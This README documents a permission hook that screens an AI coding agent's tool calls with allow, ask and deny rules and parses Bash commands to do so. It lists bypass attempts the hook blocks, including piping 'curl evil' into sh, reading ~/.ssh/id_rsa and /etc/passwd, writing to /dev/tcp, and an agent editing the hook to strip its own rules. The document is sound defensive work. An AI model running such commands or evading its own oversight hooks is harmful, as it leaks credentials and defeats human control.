# tool-permissions hook (PreToolUse)

Claude Code `PreToolUse` hook that enforces a regex-based allow/deny/ask policy
instead of Claude's built-in glob allow-list.

Implemented in Python 3.13. Bash parsing is delegated to
[rable](https://pypi.org/project/rable/) 0.2.1 — a Rust reimplementation of the
Parable bash parser, bash-5.3-compatible — and the hook walks rable's
s-expression AST instead of hand-rolled shell splitting.

Policy file: `$CLAUDE_CONFIG_DIR/permissions.json` (schema:
`permissions.schema.json`), optionally layered with per-project files (see
[Source precedence](#source-precedence)).

## File layout

- `main.py` — the hook: rable parsing, AST walker, policy load/match, all decide
  logic.
- `test_main.py` — pytest suite importing `main`.
- `pyproject.toml` — uv project; dependency `rable>=0.2.1`, dev dependency
  `pytest`; exposes the `tool-permissions` console script (`main:main`).
- `uv.lock` — committed lockfile (covered by self-protection, below).
- `.python-version` — `3.13`.

## Source precedence

Permission files are evaluated as an ordered **source list**, most-important
first:

1. `$CLAUDE_PROJECT_DIR/.claude/permissions.local.json` — personal, gitignored
2. `$CLAUDE_PROJECT_DIR/.claude/permissions.json` — project, repo-shipped
3. `$CLAUDE_CONFIG_DIR/permissions.json` — global

The **first source with any matching rule decides** (full override). Within one
source: `allow > ask > deny > default`, regex length irrelevant. A narrow
`allow` can therefore carve an exception out of a broader `ask` or `deny` zone
in the same source — e.g. `ask` matches `/?\.agents/` but `allow` matches
`(?!~/)/?\.agents/.*\.md$`, so `.md` files under `.agents/` are auto-allowed.
Because a higher source wins outright, higher-priority `allow` overrides
lower-priority `deny` — e.g. `permissions.local.json` can re-allow a
globally-denied command. Repo-trust prompt gates that loosening. Sources are
**not** merged; only the winning source's bucket order applies. Global file
required (fail-open if unreadable); project files optional and may set any
subset of buckets.

### Self-protection guard (hard-coded)

A guard sits **above** the source list: editing any of the hook's own files
under `.claude/` (global or project) can never be auto-allowed. Any `allow` for
such an edit is forced to **ask**; a resulting `deny` is left intact. Covered
files:

- `permissions.json` / `permissions.local.json` — the policy a project file
  could otherwise re-allow itself in
- `settings.json` / `settings.local.json` — where the hook is registered;
  unhooking it removes every rule
- `hooks/tool-permissions/main.py` — the script itself; editing it bypasses
  everything
- `hooks/tool-permissions/pyproject.toml` / `hooks/tool-permissions/uv.lock` —
  the dependency spec/lockfile: an edited dependency could pull in a trojaned
  package (dependency-swap vector)
- `hooks/tool-permissions/permissions.schema.json` — the policy schema

The `hooks/tool-permissions/…` paths above match both the manual deployment
(`~/.claude/hooks/tool-permissions/…`) and a plugin-installed copy under
`~/.claude/plugins/cache/<marketplace>/<plugin>/<version>/hooks/tool-permissions/…`
(the guard accepts any marketplace/plugin/version segments). `permissions.json`
and `settings.json` live directly under `~/.claude/` in both layouts, so they are
already covered.

Without this a project `permissions.local.json` could allow-list edits to itself
(or to the script/registration) and an agent could quietly strip its own rules —
or disable the hook entirely. It fires for the mutating file tools
(`Edit`/`Write`/`MultiEdit`/`NotebookEdit`) by target path, and for any `Bash`
command that references one of these paths (covering redirections, `sed -i`,
`tee`, `cp`/`mv`, and relative paths the path-arg extractor wouldn't catch).
Reading a protected file is **not** blocked. The repo source-of-truth copies
(under `agent-templates/…`, **not** `.claude/`) are intentionally not matched —
those are meant to be edited; only the deployed runtime copies are guarded.

## How it works

Before each tool call Claude sends the hook a JSON payload. The hook walks the
source list (above); within the deciding source the call is evaluated against
three buckets in priority order, emitting a single `PreToolUse` decision. For
`Bash`, the command is first parsed into an AST and walked (see
[Bash AST evaluation](#bash-ast-evaluation)) — each AST node is evaluated
through the same bucket pipeline:

```
allow  →  ask  →  deny  →  default
```

The decision is written to stdout as:

```json
{ "hookSpecificOutput": { "hookEventName": "PreToolUse", "permissionDecision": "allow" | "deny" | "ask", "permissionDecisionReason": "..." } }
```

- **deny** — `permissionDecision: "deny"` with a multi-line reason showing the
  blocked command and the matched pattern; tool call is blocked.
- **ask** — `permissionDecision: "ask"` with a reason listing the command(s)
  that need approval, so the permission dialog always shows what is being
  requested.
- **allow** — `permissionDecision: "allow"`; tool call proceeds silently.
- **default** — depends on whether the tool has a non-empty `allow` list:
  - `Bash` always falls through to _ask_.
  - A tool **with** a non-empty allow-list (e.g. `WebFetch`) is treated as
    restricted — anything outside the list falls through to _ask_. An allow-list
    is meaningless otherwise: a non-match that auto-allows lets, say, `WebFetch`
    reach any off-list domain.
  - A tool **without** an allow-list (e.g. `Read`, `Edit`, `Glob`) keeps the
    permissive _allow_ default.
  - An empty allow-list `[]` (e.g. `WebSearch`) is a bare match — _allow_
    unconditionally.

For deny and ask decisions the hook also writes a colored summary to **stderr**
for terminal visibility: bold red `✗ DENIED` or bold yellow `? ASK`, followed by
the command and (for deny) the matched pattern.

If `permissions.json` is unreadable or stdin can't be parsed the hook fails open
(exit 0, no decision) so a broken policy file never blocks every tool call.

## permissions.json format

```jsonc
{
  "version": 1,
  "allow": { "<ToolName>": ["regex", ...] },
  "deny":  { "<ToolName>": ["regex", ...] },
  "ask":   { "<ToolName>": ["regex", ...] }
}
```

- **Same format for all three files** — global, project, and project-local files
  share this shape. Only `version` is required; a file may set any subset of
  `allow`/`deny`/`ask` (a missing bucket is treated as empty).
- **Empty array `[]`** — matches the tool unconditionally regardless of input.
- **`~/`** in any pattern expands to `$HOME` at runtime, making the file
  portable across users and machines.
- **Grouped keys** — file tools may share one entry via a `|`-joined key, e.g.
  `"Read|Write|Edit|MultiEdit": [...]`, expanded to per-tool entries at load.
  Non-file tools (`Bash`, `WebSearch`, `WebFetch`, `Skill`) must appear alone.

### Match targets per tool

| Tool                                 | Matched against |
| ------------------------------------ | --------------- |
| `Bash`                               | `command`       |
| `Read`, `Edit`, `MultiEdit`, `Write` | `file_path`     |
| `NotebookEdit`                       | `notebook_path` |
| `WebSearch`                          | `query`         |
| `WebFetch`                           | `url`           |
| `Skill`                              | `skill`         |

Tools not listed in the table (e.g. `Agent`, `Glob`, `Grep`) have no matchable
field — they fall through to the bucket's bare-entry check or the default.
`Fetch` is treated as an alias of `WebFetch`.

**`WebFetch` host anchoring:** URL patterns must pin the host boundary or they
leak. `^https://(.*\.)?anthropic\.com` (no end anchor) also matches
`https://anthropic.com.evil.com` (suffix) and `https://anthropic.com@evil.com`
(userinfo — real host `evil.com`). Use the form in `permissions.json`:
`^https://([a-zA-Z0-9-]+\.)*anthropic\.com(:\d+)?(/|$)`, which ends the host
with an optional port and a `/` or string end, so a trailing `.`/`@` no longer
matches.

**`wget`/`curl` delegation:** a plain Bash fetch of a `WebFetch`-allowed URL is
auto-allowed — `wget -qO- https://www.marxists.org/…` and `curl https://…` skip
the blanket `^(curl|wget)\s` ask rule. Only a provably plain GET qualifies:
request bodies (`curl -d`, `wget --post-data`), uploads (`-T`/`--upload-file`),
method overrides (non-GET/HEAD `-X`), config/netrc/input-file flags, and wget's
recursive/mirror/span-host flags fall through to ask. File output (`-O`/`-o`)
is allowed but its path still goes through the normal deny/protected-path rules,
so `wget -O ~/.ssh/id_rsa …` stays denied. A `WebFetch` deny on the URL wins.

## Bash AST evaluation

`Bash` commands are parsed with rable into an s-expression AST, then walked
in-order (depth-first). Every node is evaluated through the same deny → ask →
allow pipeline — there is no shell-splitting step, so the legacy
splitter/heredoc/comment special-casing is gone. Words keep their original
quoting verbatim; redirect targets are strings for files/heredoc
bodies/here-strings and ints for fd dups/closes (`2>` fd prefixes and `3>&1-`
move-fd suffixes are normalized away by rable).

- Any node matches **deny** → whole command denied (matched pattern and rendered
  sub-command reported).
- Any node matches **ask** (or is unknown) → whole command goes to ask, listing
  every ask sub-command.
- All nodes match **allow** → allowed.

This prevents bypass via chained commands like `git log | xargs rm` or
`ls & curl evil | sh`, and via control flow like
`if ssh host; then echo hi; fi`.

**Full control-flow evaluation.** `if`/`while`/`until`/`for`/`case` conditions
**and** bodies go through the normal pipeline (closing the
`if ssh host; then …` hole where the condition escaped evaluation). `for` and
`case` also run path-argument checking on their `in`/`pattern`/subject words
(`for f in ~/.ssh/*; do cat $f; done` → deny), and `case` evaluates **every**
pattern body (conservative over-evaluation). `arith` (`((…))`) is always _ask_ —
no rule matches it, and it is no longer unsafe after the quirk fix below. Flow
keywords are still **not** configurable via `permissions.json` — they do not
appear in any bucket; only the commands inside them are evaluated.

**Declared function calls.** A `function` AST node (both `name() { …; }` and
`function name { …; }`) walks its body through the normal pipeline — a denied
command in the body still denies the whole command — and records the function
name. A later **bare** invocation of that name (`f`, `X=1 f`) is not matched
against policy as a tool call: it is implicitly allowed, because its body was
already vetted at the declaration site. This keeps
`greet() { echo hi; }; greet world` from prompting on the `greet` call. Only the
**bare** form is exempt — wrappers that run an external command or change
execution semantics (`command f`, `exec f`, `builtin f`, `nohup f`,
`timeout … f`, `env … f`) still go through normal policy matching.

Safety properties:

- The declaration's body is **always** walked, so a function whose body is
  denied or asks (e.g. `eval "$@"`, `"$@"`, `sh -c "$@"`, `ssh host`) still
  denies/asks the whole command; a redefinition
  (`f() { echo hi; }; f() { ssh host; }; f`) is caught because the second body is
  walked.
- A **deny** rule on the call itself still beats the implicit allow
  (`deny > allow`).
- The call's arguments still pass through the structural allow guard and
  path-argument checking, so `f $(rm -rf ~)` asks and `f ~/.ssh/id_rsa` is
  denied when that path is read-denied.
- Scope follows source order and shell semantics: a call **before** its
  definition is not a function call (→ ask); a function defined inside a command
  substitution does not leak back out (the substitution body is re-evaluated
  with a *copy* of the declared set); and `xargs f` re-evaluates `f` in a fresh
  scope, since `xargs` runs external commands rather than the function.

**Fail-closed.** Unparseable input (`ParseError`/`MatchedPairError`) → **ask**.
Otherwise the parser is trusted: rable is a full bash parser, and bash refuses
to execute non-round-tripping input, so a dropped word (e.g. an unclosed-quote
word) can't be a real-world bypass.

**Empty commands.** A bare `;` (empty command) → **allow** (the legacy splitter
asked on this). A command node with zero words and no redirects → allow (nothing
executes: bare `;`, trailing `&&`, stray `then`); zero words **with** redirects
→ ask (a redirect alone can write). An unknown AST node kind → conservative ask
with a stderr warning.

**Canonical match strings.** A command is matched as its single-space-joined
canonical words — the unquoted command word followed by the remaining words,
each keeping its original raw text (including quotes), plus the rendered
redirects. Matching no longer depends on byte-exact spacing of the source:
`git  log` and `git log` produce the same match string. Patterns that depend on
quotes preserved in args (e.g. `^git (-C ['\"]?\S+['\"]? )*`) still work, because
words keep their original quoting.

### Command-name normalization

Before matching, each command is resolved to its real command name so anchored
(`^…`) rules can't be dodged by dressing up the command:

- leading environment assignments are stripped — `GIT_DIR=/tmp git push` →
  `git push`
- command wrappers are stripped — `command`, `exec`, `builtin`, `nohup`
  (e.g. `command rm -rf ~` → `rm -rf ~`); `command -v/-V` stops and keeps
  `command` (the allow rule `^command(\s+-[vV](\s|$)|\s*$)` depends on all three
  forms), and `-p/-P` is skipped as a flag. `eval` is **not** stripped: it
  re-parses its argument string as shell code, so the hook fails closed to _ask_
  (like `sh -c`) rather than risk `eval "echo; ssh"` matching `^echo`.
- `timeout` is stripped together with its option flags (`-s`/`--signal`,
  `-k`/`--kill-after`) and the mandatory duration token, re-exposing the inner
  command — `timeout 5 git push` → `git push`, `timeout -s KILL 10 rm -rf ~` →
  `rm -rf ~`. Without this, `timeout` would be a blanket wrapper around every
  deny rule.
- `env` is stripped together with its value-flag options (`-u`/`--unset`,
  `-a`/`--argv0`, plus boolean flags and the `--`/`-` terminator) and leading
  `NAME=value` assignments, re-exposing the inner command — `env FOO=1 ssh host`
  → `ssh host`, `env -i FOO=1 rm -rf ~` → `rm -rf ~`. Two options are **not**
  stripped because they make the inner command opaque, and instead fail closed
  to _ask_: `-S`/`--split-string` (its split words merge with the trailing args,
  so `env -S 'ssh' host x` runs `ssh host x`) and `-C`/`--chdir` (it rebases
  every relative path, so `env -C ~/.ssh cat id_rsa` reads `~/.ssh/id_rsa`).
  Their glued short forms (`-C~/.ssh`, `-Sssh`) are equally opaque and fail
  closed too.
- the command-name word is unquoted/unescaped — `"rm"`, `'rm'`, `r"m"`, `\rm`
  all resolve to `rm`
- a trailing `\r` is stripped from each word (CRLF input)

`time` is stripped structurally rather than as a text wrapper: it is a `time`
AST node whose inner command is evaluated (bare `-p` children skipped). Note this
covers the bash `time` **keyword** only; the distinct `/usr/bin/time` binary (and
`command time`, which forces it) is left fail-closed to _ask_ because of its
`-o FILE` output flag.

Matching (deny/ask/allow) runs against this normalized string, while the
**structural allow guard runs on the untouched original AST** — so stripping an
assignment such as `X=$(curl evil) ls` reveals `ls` for matching yet still trips
the unsafe guard on the original `$(…)` and downgrades to _ask_.

A command that is *only* assignments — no command name at all (`ids="$1"`,
`export X=1`, `local -a X=1`) — runs nothing external, so it is **allowed**
outright (the single-`$(…)` form is recursed into first; a quoted substitution
or a write redirect still fails closed to _ask_). A bare modifier (`export`) or
bare wrapper (`env`, `timeout`) is *not* assignment-only: it prints the
environment or is an opaque wrapper, so it keeps the fail-closed _ask_.

## Structural allow guard

A prefix allow-rule can only vouch for the start of a command, not its
arguments. A matched **allow** is therefore downgraded to **ask** when the
command contains a construct that could execute or write beyond the matched
prefix. The check is **AST-based**: it scans each word, redirect-target, and
heredoc-body token quote-aware (constructs inside single quotes are ignored;
inside double quotes only substitution is flagged; a backslash escapes the next
character):

- command substitution `$(…)` / `` `…` `` (also detected inside double quotes)
- process substitution `<(…)` / `>(…)`
- prompt-string expansion `${x@P}`
- write-redirection to a real path — ops `>`, `>>`, `>|`, `&>`, `&>>`, and `>&`
  with a **string** target. `>/dev/null` is exempt, as are `/tmp/` and
  `$HOME/.claude/tmp/` targets; fd dups/closes (`>& 1`, `>&- 0`, `<& 0`) are int
  targets and safe. The here-string `<<<` is safe.

**Quirk fix — arithmetic no longer flagged.** `$((arithmetic))` is no longer
flagged as command substitution. rable distinguishes arithmetic expansion from
`$(`; the guard skips the `$((` opener but keeps scanning inside, so a nested
`$(cmd)` inside `$((x + $(cmd)))` is still flagged. The legacy implementation
couldn't tell the two apart and flagged `$((…))` conservatively.

**Stricter than legacy.** `>&` with a string target (`>& output.log`) and `>|`
are now flagged — legacy silently missed `>& output.log`. `<>` is still **not**
flagged (parity with the legacy gap — a read/write truncating-open on an
existing file; documented, not fixed).

**Lossy `cond` negation.** rable drops the negation `!` inside `[[ … ]]`
(`cond`/`cond-term` nodes). Lossy but irrelevant to permissions — no command
executes in a `cond`; the walker runs path-argument checking and the unsafe-guard
text scan over every cond-term string instead.

This closes side-channels such as `ls $(curl evil | sh)` and
`git log > ~/.bashrc` (which would otherwise bypass the Read/Write deny-list).
Deny and ask rules are evaluated before this guard.

Per-command flag guards in `permissions.json` complement this by refusing to
auto-allow exec/write-capable flags on otherwise read-only tools:
`fd -x`/`-X`/`--exec`/`--exec-batch`, `rg --pre`,
`sort --compress-program`/`--output`/`-o`/`--files0-from`,
`find -exec`/`-delete`/`-fprintf`/…, `yq -i`/`--inplace`,
`ast-grep … -U`/`--update-all`/`--rewrite`,
`git … --output`/`--ext-diff`/`--upload-pack`/`--open-files-in-pager`/`-O`/`--delete`/`-D`,
`npm audit fix` (install via the `audit` allow-rule),
`ip … add`/`del`/`set`/`flush`/… (mutating sub-commands of the `ip` read-rule).
The `~/.claude/skills/` allow-rule also forbids `..` so a path can't
traverse out of the skills directory.

## sed safety

`sed` can execute shells (`e` flag/command), write files (`-i`, `w`/`W`), and
read files (`r`/`R`), so it can't sit in a static allow regex — `e`/`w` flags
are indistinguishable from regex characters to a pattern matcher. Instead a
dedicated parser auto-allows a `sed` invocation **only when it can prove the
whole command is stdout-only**, and **fails closed** otherwise (unknown
flag/command/delimiter, or a malformed script → falls through to _ask_). The
parser runs in place of an allow-list entry, then goes through the same
structural and path-arg guards as a regex match.

The sed parser is a hand-written state machine — a direct port of the
TypeScript implementation. rable parses Bash, not sed's script DSL, so it can't
help here.

A `sed` call is auto-allowed only if **every** part is recognized safe:

- **Flags** — `-n`/`-E`/`-r`/`-s`/`-z`/`-u` (and bundles like `-nE`), the
  equivalent long flags, and `-e`/`--expression`. Anything else —
  `-i`/`--in-place` (write), `-f`/`--file` (un-vettable external script), or an
  unknown flag — fails closed.
- **Script** — a sequence of: substitutions `s/…/…/flags` where the flags are
  only `g p i I m M` and digits (the exec flag `e` and write flag `w`/`W` are
  rejected), plus `p`/`P`/`d`/`D`/`=` commands, with optional addresses (`5`,
  `$`, `1,5`, `2~3`, `/regex/`, `!`). Delimiters are scanned generically, so
  `s|/a|/b|g` works. Any other command (`e`, `w`, `r`, `y`, labels, `{ }`
  groups, …) fails closed.
- **Positional file arguments** are allowed — but a sensitive one
  (`sed 's/a/b/' ~/.ssh/config`) is still **denied** by the path-arg check
  below, since `sed` is path-sensitive.

So `sed 's/foo/bar/g' file`, `sed -n '1,20p' README.md`, and
`sed -E 's/a+/b/' a b` run silently, while `sed -i …`, `sed '1e id'`, `s/a/b/e`,
`s/a/b/w out`, and `sed -f script.sed` all prompt.

## awk safety

`awk`/`gawk`/`mawk`/`nawk` expose `system()`/exec anywhere in the program
string, so — like `sed` — they can't sit in a static allow regex. Instead a
dedicated parser auto-allows an awk invocation **only when it can prove the
program does no I/O redirection, subprocess, or extension loading**, and
**fails closed** otherwise (any unflagged construct, unknown flag, or
malformed program → falls through to _ask_).

The awk program must be a **fully single-quoted shell word** (no shell
interpolation of `$1`/backticks); double-quoted, unquoted, or concat-quoted
programs ask. The scanner then rejects, anywhere in the program:

- `system(...)`, and the reflection identifiers `SYMTAB`/`FUNCTAB`/`dbmopen`.
- Pipes and coprocesses: `|`, `|&` (`cmd | getline`, `print … | cmd`).
- `getline` input redirection (`getline x < file`, at any paren depth).
- `print`/`printf` output redirection (`> file`, `>> file`, even `print x>y`).
- The gawk `/inet/` special-file prefix in string literals.
- Any `@` (indirect calls `@f(x)`, `@load`, `@include`).

Relational `>`/`>=`/`<=` and division are recognized as safe. Flags are
whitelisted (`-F`, `-v`, `-c`, `-e`/`--source`, `--version`/`-V`/`--help`); every
other flag — `-f`/`--file` (opaque program source), `-i`/`--include` in-place,
`-E`, `-l`/`--load`, `-d`/`-p`/`-o` dumps, `-W` — fails closed. `busybox`
wrappers stay deny-listed at policy level.

So `awk '{print $1}' f`, `awk -F: '{print $2}'`, and `gawk '{print}'` run
silently, while `awk 'BEGIN{system("id")}'`, `awk '{print $1 > "out"}'`,
`awk 'getline x < "/etc/passwd"'`, and `gawk -i inplace '{print}' f` all prompt.

A contrived `/inet/` string-concat obfuscation (`"/i" "net/tcp/…"`) can't open a
socket without `|`/`|&`/`<`, which are flagged (and would be a runtime error in
mawk), so the literal `/inet` check is belt-and-suspenders.

`mlr` exposes the same exec-in-DSL surface but has no such analyzer yet, so it
stays in the _ask_ bucket.

## xargs inner-command delegation

`xargs` is evaluated differently from other commands. Rather than matching
`xargs` itself against the allow/ask buckets, the hook strips `xargs`'s own
flags and re-evaluates the **inner command** through the full deny → ask → allow
pipeline. This means `xargs rg`, `xargs grep`, or `xargs cat` are auto-allowed
exactly like their bare counterparts, while `xargs git push` is denied and
`xargs rm` asks.

**Flag stripping:** xargs flags that take a separate value token are consumed
together with their value — the short flags `-I`, `-n`, `-P`, `-L`, `-l`, `-d`,
`-a`, `-E`, `-s`, and the long forms `--delimiter`, `--replace`, `--max-lines`,
`--max-args`, `--max-procs`, `--eof`, `--arg-file`, `--max-chars`,
`--process-slot-var`. Boolean flags (`-0`, `-t`, `-p`, `-r`, …) and value-flags
with `=` (`--max-args=4`, `-l4`) are consumed without taking an extra token.
(Legacy missed the long value-flags without `=` — `--max-args 4` fell through to
_ask_; now fixed.) A bare inner command from `{rg, grep, ag, fgrep, egrep}` gets
a synthetic `__xargs_input__` argument appended, so allow rules like `^rg\s`
(which require trailing content) still match `xargs rg`.

**Safety invariants preserved:**

- The structural allow guard runs on the **original** `xargs …` command before
  delegation, so `xargs rg $(cat /etc/passwd)` still downgrades to _ask_.
- Path-argument checking runs on the **inner** command.
  `xargs cat ~/.ssh/id_rsa` is denied the same way bare `cat ~/.ssh/id_rsa` is.
- The `-a FILE`/`--arg-file FILE` value and any `< FILE` read-redirect are
  re-checked as read paths before delegating, so `xargs -a ~/.ssh/id_rsa echo`
  and `xargs echo < ~/.ssh/id_rsa` can't dodge the read-path protection (they'd
  otherwise drop the path and surface as `echo` → _allow_).
- An explicit `xargs` entry in the **deny** bucket still fires before
  delegation.
- Bare `xargs` (no inner command) falls through to the _ask_ bucket entry as
  usual.
- Wrappers compose: `timeout 5 xargs rg` strips `timeout` → `xargs rg` →
  delegates to `rg` → allowed.

## Path-argument checking

A command that matches an allow-rule is still re-checked when it passes
file/directory paths as arguments. This runs for **every** allowed command, not
an enumerated subset — any reader that isn't explicitly listed (`tac`, `cut`,
`nl`, `rev`, `comm`, `colordiff`, the `csv*` tools, …) would otherwise leak
credential files past the deny-list. Every path argument — operand, redirect
target, and file-tool `file_path`/`notebook_path` alike, including `.`, `..`,
and bare relative names — is resolved to an absolute path against
`$CLAUDE_PROJECT_DIR` before matching, then run through the same source
priority. **Which rule set applies depends on whether the path is read or
written**:

- **Input** operands (paths the command reads) are resolved as a **Read**
  decision — so `cat ~/.ssh/id_rsa`, `tac ~/.aws/credentials`, and
  `sed 's/a/b/' ~/.aws/credentials` are all blocked even though
  `cat`/`tac`/`sed` are otherwise allowed.
- **Output** operands (paths the command writes, creates, or deletes) are
  resolved as a **mutating** decision (`Edit`/`Write`/`MultiEdit`/
  `NotebookEdit`) — so `rm ~/.ssh/id_rsa`, `sed -i … ~/.ssh/id_rsa`, and
  `cp a ~/.ssh/id_rsa` are governed by Edit/Write rules, not Read rules.

The input/output split is per-argument and follows standard CLI conventions:

- read-only commands (`grep`, `cat`, `head`, `tail`, `cut`, `sort`, `uniq`,
  `comm`, `join`, `cmp`, `wc`, `ls`, `diff`, `file`, `stat`, `jq`, `rg`,
  `html2text`, `tr`, …) treat every operand as an **input**;
- `cp`, `install`, `ln`, and `rsync` treat the last operand (or cp/mv's
  `-t DIR`/`--target-directory[=]DIR`) as the **output** and the rest as inputs;
- `mv` treats its sources as **both** (read to move them, then removed) and its
  destination as output;
- `rm`, `rmdir`, `unlink`, `truncate`, `shred`, and `mkdir` treat every operand
  as an **output** (deleted/truncated/created);
- output-via-flag commands (`pandoc`, `mutool`, `yt-dlp` via `-o`/`--output[=]`,
  `unzip` via `-d`/`--directory[=]`, `wget` via `-O`/`--output-document[=]` or
  `-P`/`--directory-prefix[=]`, `curl` via `-o`/`--output[=]` or
  `--output-dir[=]`) treat the flag value as the **output** and the remaining
  operands as inputs;
- `pdftotext` and `tesseract` treat the first positional as the **input** and
  the second (when present) as the **output**;
- `sed -i` (in-place) treats its file operands as **outputs**;
- `sed`/`awk` (and their variants) treat their first operand as a script or
  program, not a path — it is skipped, and only the remaining file operands are
  checked;
- remote URL operands (`https://…`, any non-`file` `scheme://…`) are not
  filesystem paths and are skipped — so `yt-dlp -o vid.mp4 https://…/x.env` is
  not read as a path ending in `.env`. A `file:` URL (`file:///etc/shadow`,
  `file://localhost/…`, `file:/…`, even percent-encoded) addresses the local
  filesystem, so it is resolved to its path and checked like any other path;
- any other command keeps the conservative default: operands are **inputs**
  (Read), so an unrecognized reader can't leak credentials.

File-redirection targets are classified independently of the command: `<` is an
input (Read), `>`, `>>`, `>|`, `&>`, `&>>`, and `>& file` are outputs
(mutating) — so `cat a > ~/.ssh/id_rsa` is governed by Edit/Write rules.
Heredoc delimiters (`<<`, `<<-`) and here-string content (`<<<`) are literal
strings, not file paths, so they are not checked.

- If the highest-priority source with an opinion on that path says
  **deny**/**ask**, the command is denied/asked.
- A higher-priority file can override this by explicitly **allowing** the path
  for the matching tool (`Read` for inputs, `Edit`/`Write` for outputs) — e.g.
  `permissions.local.json` with `Read: ["^~/\\.ssh/.*"]` re-allows
  `cat ~/.ssh/id_rsa`.
- A harmless `echo ~/.ssh/id_rsa` is also caught; that false positive errs on
  the safe side.

Tokenisation is quote-aware and each argument is unquoted before matching, so
embedded quotes can't dodge the check — `cat ~/".ssh"/id_rsa` resolves to
`~/.ssh/id_rsa` and is denied. Every path — operand, redirect target, and
file-tool path alike, including `.`, `..`, and bare relative names — is
expanded (`~`) and resolved lexically to an absolute, normalized path (`..`
collapsed, leading slash runs collapsed, `file:` URLs mapped to their local
path, relative paths resolved against `$CLAUDE_PROJECT_DIR` — falling back
to the hook process's working directory when unset — no symlink resolution)
*before* matching — otherwise a traversal like `cat ~/decoy/../.ssh/id_rsa`
would reach `~/.ssh/id_rsa`, and `cat //etc/shadow` or
`cat file:///etc/shadow` would address `/etc/shadow`, without ever
string-matching the deny pattern anchored on the real path.

## cp/rm/rmdir/mv/gio-trash project-relative auto-allow

`cp`, `rm`, `rmdir`, `mv`, and `gio trash` have no static allow-rule (a bare
`rm` or `cp` is too broad to allow-list globally), so by default they fall
through to _ask_. As a narrower alternative, the hook auto-allows one of these
commands when **every** positional argument (source and destination alike,
including `cp`/`mv`'s `-t DIR`/`--target-directory=DIR`) resolves to a path
inside `$CLAUDE_PROJECT_DIR`, and none of the resolved paths are:

- **specifically protected** — the same input/output-aware rule check described
  above: a deny/ask on a **read** operand fires for `Read`, and on a
  **written/deleted** operand fires for `Edit`/`Write` (e.g. a project file
  matched by a `.env`/credential pattern);
- **inside `.claude/` or `.git`** (at any depth) — a bulk `cp -r .claude
  backup` or `rm -rf .git` can't be vetted per-file the way a single credential
  path can, so these always fall through to the normal _ask_ default instead
  of being silently allowed. (`rm -rf .git` is never auto-*denied* by this
  check — a deliberate one is still just an _ask_ away.)
- **not git-tracked** — every operand must be committed or staged (checked via
  `git ls-files` against `$CLAUDE_PROJECT_DIR`). Gitignored files, brand-new
  untracked files, and non-repo / git-error / timeout cases all fall through to
  _ask_, since none of them can be restored from version control. A path that
  resolves to a directory is tracked if it contains any tracked file. This
  makes `cp foo.py new.py`, `mv old.py new.py`, or `rm newfile` on a
  not-yet-committed file prompt — an explicit allow rule under a mutating file
  tool (`Write`/`Edit`/`MultiEdit`/`NotebookEdit`, e.g. in
  `permissions.local.json`) carves out an exception: such a path is trusted to
  be modified/deleted, version-controlled or not, so it is exempt from the
  git-tracked gate. A `Read` allow does **not** exempt — read access is not
  permission to delete. A deny/ask on the path still wins.
- **the project root itself is removed** — an operand that resolves to
  `$CLAUDE_PROJECT_DIR` itself on `rm`/`rmdir`/`gio trash` (or as a `mv`
  source) is **denied** outright, never merely asked: deleting or moving the
  project directory never makes sense. (`cp` is unaffected — it reads its
  source, so `cp -r . backup` is not a hard deny.)

This check only runs as a fallback when no `permissions.json` rule already has
an opinion on the whole command — an explicit `ask`/`deny` on `rm`/`cp`/`mv`/
`gio trash` in policy still wins outright. It requires `$CLAUDE_PROJECT_DIR` to
be set; if it isn't, these commands fall through to _ask_ as before. Relative
arguments are resolved against `$CLAUDE_PROJECT_DIR` (falling back to the hook
process's working directory), the same base `sed -i` path resolution uses. The
usual **structural allow guard** still applies afterward, so
`rm $(cat list.txt)` or `cp file > /dev/tcp/...` downgrade to _ask_ regardless
of how safe the plain arguments look.

## Limitations

- **Self-protection only covers files under `.claude/`.** The guard forces _ask_
  on edits to the deployed hook (scripts, dependency spec, schema,
  `settings.json` registration, policy files) under any `.claude/` directory —
  see [Self-protection guard](#self-protection-guard-hard-coded). It does **not**
  cover the repo source-of-truth copies under `agent-templates/…` (by design —
  those are edited during development), nor a hook deployed outside a `.claude/`
  directory. It also can't stop a process that bypasses the hook entirely
  (direct filesystem writes from outside Claude Code). Treat write access to the
  hook's own source on disk as equivalent to full policy control.
- **Unparseable Bash input fails closed to _ask_.** `ParseError`/
  `MatchedPairError` → ask, which can prompt on commands that aren't actually
  dangerous — a conservative over-ask, never a silent bypass.
- **`<>` read/write redirection is not flagged** by the structural allow guard
  (parity with the legacy gap — a truncating-open on an existing file).
- **`cond` negation `!` is dropped by rable** inside `[[ … ]]`. Lossy, but
  irrelevant to permissions (no command executes in a `cond`).
- **Bundled short-option value parsing** in the cp/rm/rmdir/mv/gio-trash
  project-relative check only special-cases `-t`/`--target-directory` on `cp`
  and `mv` (space, `-tDIR`, `--target-directory=DIR`, and bundled `-rtDIR`
  forms are all recognized for those two). Any other value-taking short flag,
  on any command, isn't parsed and falls through to _ask_ — never a silent
  bypass.
- **Bare flow keywords parse inconsistently under rable 0.2.1.** `do`/`then`/
  `else`/`elif` (and `;;`) parse as empty commands and are **allowed**; `if`/
  `while`/`until`/`for`/`done`/`fi`/`esac`/`case` raise `ParseError` and **ask**.
  A deliberate consequence of the "trust the parser" policy.
- **The git-tracked gate runs one `git ls-files` subprocess per fallback
  evaluation.** A small cost on each auto-allowed `cp`/`rm`/`rmdir`/`mv`/
  `gio trash`, but these are not hot paths. It fails closed (→ _ask_) if `git`
  is missing, the project isn't a repo, or the call times out.
